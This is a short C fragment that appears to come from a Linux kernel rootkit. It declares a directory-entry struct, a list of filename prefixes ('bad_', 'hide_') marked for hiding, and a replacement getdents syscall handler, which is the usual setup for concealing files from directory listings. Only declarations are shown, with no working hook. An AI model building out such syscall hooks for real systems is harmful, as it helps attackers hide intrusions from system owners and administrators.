static struct dirent
{
	uint64_t		d_ino;
	int64_t		d_off;
	unsigned short int	d_reclen;
//	unsigned char	d_type;
	char		d_name[];
};


char *(hide_prefix[]) = {"bad_","hide_"};

asmlinkage int
my_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

